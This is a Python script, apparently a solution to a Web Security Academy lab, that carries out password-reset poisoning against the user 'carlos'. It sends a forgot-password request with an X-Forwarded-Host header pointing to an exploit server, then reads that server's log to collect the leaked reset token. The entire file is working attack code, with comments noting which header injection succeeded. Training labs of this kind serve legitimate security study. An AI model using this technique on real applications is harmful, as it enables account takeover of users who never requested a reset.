#!/usr/bin/python3

# (1) Modifying Host header: Faild. It will not resolve to the right host if I modify it. - 404 "Resource not found - Academy Exploit Server"
# (2) "X-Forwarded-Host" successfully modified the host header

import requests
import sys

def connect(url, endpoint, username, url_exploit, url_valid):

    data = {
        "username": username,
    }

    headers = {
        "Host": f"{url_valid}",
        "X-Forwarded-Host": f"{url_exploit}",
    }

    s = requests.Session()
    r = s.post(url + endpoint, headers=headers, data=data)
    if r.status_code == 200:
        print('[INFO] Poisoned email reset link sent!')
        read_log(url_exploit, endpoint_log)
    else:
        sys.exit(1)

def read_log(url_exploit, endpoint_log):

    r = requests.get("https://" + url_exploit + endpoint_log)
    print(r.text)


if __name__ == '__main__':
    url = "https://ac8b1fa71f926b95c0874d8b00c9008e.web-security-academy.net"
    url_valid = "ac8b1fa71f926b95c0874d8b00c9008e.web-security-academy.net"
    url_exploit = "exploit-acaf1f541faf6bbfc0924d35014000eb.web-security-academy.net"
    endpoint = "/forgot-password"
    endpoint_log = "/log"
    username = 'carlos'

    connect(url, endpoint, username, url_exploit, url_valid)